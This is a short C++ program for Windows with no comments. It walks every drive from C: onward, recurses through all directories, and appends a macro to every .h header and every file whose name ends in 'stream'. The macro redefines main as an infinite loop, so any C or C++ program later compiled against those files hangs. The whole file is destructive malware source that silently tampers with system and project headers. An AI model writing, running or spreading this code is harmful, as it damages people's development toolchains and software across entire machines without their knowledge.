#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <iostream>
#include <Windows.h>	

char patch[] = "\n#ifndef main\n#define main main(){while(1);}int a\n#endif\n";
char path[] = "C:";
wchar_t w_path[] = L"C:";

void insert(char *path) {
	FILE *file;
	fopen_s(&file, path, "a");
	fprintf(file, "%s\n", patch);
	fclose(file);
	printf("---%s---", path);
}

void find_all(char *path);
void find_h(char *path);
void find_stream(char *path);

int main() {
	do {
		find_all(path);
		path[0]++;
		w_path[0]++;
	} while (GetDriveType(w_path) != DRIVE_NO_ROOT_DIR);
	return 0;
}


void find_all(char *path) {

	find_h(path);
	find_stream(path);

	_finddata_t find;
	int handle;
	char buf[512] = { 0 };
	strcat_s(buf, 512, path);
	strcat_s(buf, 512, "/*");
	handle = _findfirst(buf, &find);
	if (handle != -1) {
		do {
			if (strcmp(find.name, ".") == 0)
				continue;
			if (strcmp(find.name, "..") == 0)
				continue;
			if ((find.attrib &_A_SUBDIR) != 0) {
				char full[512] = { 0 };
				strcat_s(full, 512, path);
				strcat_s(full, 512, "/");
				strcat_s(full, 512, find.name);
				find_all(full);
			}
			
		} while (_findnext(handle, &find) != -1);
	}
}

void find_h(char *path) {
	_finddata_t find;
	int handle;
	char buf[512] = { 0 };
	strcat_s(buf, 512, path);
	strcat_s(buf, 512, "/*.h");
	handle = _findfirst(buf, &find);
	if (handle != -1) {
		do {
			if ((find.attrib &_A_SUBDIR) == 0) {
				char full[512] = { 0 };
				strcat_s(full, 512, path);
				strcat_s(full, 512, "/");
				strcat_s(full, 512, find.name);
				insert(full);
			}
		} while (_findnext(handle, &find) != -1);
	}
}

void find_stream(char *path) {
	_finddata_t find;
	int handle;
	char buf[512] = { 0 };
	strcat_s(buf, 512, path);
	strcat_s(buf, 512, "/*stream");
	handle = _findfirst(buf, &find);
	if (handle != -1) {
		do {
			if ((find.attrib &_A_SUBDIR) == 0) {
				char full[512] = { 0 };
				strcat_s(full, 512, path);
				strcat_s(full, 512, "/");
				strcat_s(full, 512, find.name);
				insert(full);
			}
		}while (_findnext(handle, &find) != -1);
	}
}